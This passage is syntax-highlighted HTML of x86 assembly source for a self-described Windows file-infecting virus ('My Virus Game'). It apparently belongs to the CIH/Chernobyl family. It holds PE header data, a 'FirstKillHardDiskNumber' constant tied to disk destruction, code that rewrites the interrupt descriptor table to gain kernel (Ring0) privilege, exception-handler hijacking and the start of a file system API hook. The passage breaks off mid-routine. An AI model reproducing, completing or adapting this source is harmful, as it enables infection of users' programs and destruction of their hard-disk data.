                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
 
</span><span class="sc5">OriginalAppEXE</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">
 
</span><span class="sc1">; ****************************************************************************</span><span class="sc0">
</span><span class="sc1">; *                     My Virus Game                                        *</span><span class="sc0">
</span><span class="sc1">; ****************************************************************************</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *                    Constant Define                    *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">TRUE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">TRUE</span><span class="sc0">
 
</span><span class="sc5">MajorVirusVersion</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">MinorVirusVersion</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
 
</span><span class="sc5">VirusVersion</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">MajorVirusVersion</span><span class="sc4">*</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc5">MinorVirusVersion</span><span class="sc0">
 
 
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
 
    </span><span class="sc5">FirstKillHardDiskNumber</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc5">HookExceptionNumber</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc0">
 
</span><span class="sc9">ELSE</span><span class="sc0">
 
    </span><span class="sc5">FirstKillHardDiskNumber</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc5">HookExceptionNumber</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc0">
 
</span><span class="sc9">ENDIF</span><span class="sc0">
 
 
</span><span class="sc5">FileNameBufferSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">7fh</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">VirusGame</span><span class="sc0">               </span><span class="sc9">SEGMENT</span><span class="sc0">
 
                        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc0">
                        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">GS</span><span class="sc4">:</span><span class="sc5">VirusGame</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *             Ring3 Virus Game Initial Program          *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">MyVirusStart</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Let's Modify Structured Exception *</span><span class="sc0">
</span><span class="sc1">; * Handing, Prevent Exception Error  *</span><span class="sc0">
</span><span class="sc1">; * Occurrence, Especially in NT.     *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@0</span><span class="sc0">
</span><span class="sc5">@0</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StopToRunVirusCode</span><span class="sc4">-</span><span class="sc5">@0</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Let's Modify                      *</span><span class="sc0">
</span><span class="sc1">; * IDT(Interrupt Descriptor Table)   *</span><span class="sc0">
</span><span class="sc1">; * to Get Ring0 Privilege...         *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get IDT Base Address</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
 
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HookExceptionNumber</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc0"> </span><span class="sc1">; ZF = 0</span><span class="sc0">
 
            </span><span class="sc6">cli</span><span class="sc0">
 
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get Exception Base</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Entry Point</span><span class="sc0">
 
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyExceptionHook</span><span class="sc4">-</span><span class="sc5">@1</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">         </span><span class="sc1">; Modify Exception</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Entry Point Address</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Generate Exception to Get Ring0   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">HookExceptionNumber</span><span class="sc0"> </span><span class="sc1">; GenerateException</span><span class="sc0">
</span><span class="sc5">ReturnAddressOfEndException</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Merge All Virus Code Section      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc5">LoopOfMergeAllVirusCodeSection</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
 
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">QuitLoopOfMergeAllVirusCodeSection</span><span class="sc0"> </span><span class="sc1">; ZF = 1</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoopOfMergeAllVirusCodeSection</span><span class="sc0">
 
</span><span class="sc5">QuitLoopOfMergeAllVirusCodeSection</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Generate Exception Again          *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">HookExceptionNumber</span><span class="sc0"> </span><span class="sc1">; GenerateException Again</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Let's Restore                     *</span><span class="sc0">
</span><span class="sc1">; * Structured Exception Handing      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">ReadyRestoreSE</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">sti</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestoreSE</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * When Exception Error Occurs,      *</span><span class="sc0">
</span><span class="sc1">; * Our OS System should be in NT.    *</span><span class="sc0">
</span><span class="sc1">; * So My Cute Virus will not         *</span><span class="sc0">
</span><span class="sc1">; * Continue to Run, it Jmups to      *</span><span class="sc0">
</span><span class="sc1">; * Original Application to Run.      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">StopToRunVirusCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StopToRunVirusCode</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc5">RestoreSE</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Return Original App to Execute    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00401000h</span><span class="sc0">       </span><span class="sc1">; Push Original</span><span class="sc0">
</span><span class="sc5">OriginalAddressOfEntryPoint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; App Entry Point to Stack</span><span class="sc0">
 
                        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc1">; Return to Original App Entry Point</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *             Ring0 Virus Game Initial Program          *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">MyExceptionHook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@2</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">MyExceptionHook</span><span class="sc0">
 
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">InstallMyFileSystemApiHook</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Do My Virus Exist in System !?    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">AllocateSystemMemoryPage</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ReadyRestoreSE</span><span class="sc4">-</span><span class="sc5">ReturnAddressOfEndException</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Return to Ring3 Initial Program   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">ExitRing0Init</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">     </span><span class="sc1">; Restore Exception</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
 
            </span><span class="sc6">iretd</span><span class="sc0">
 
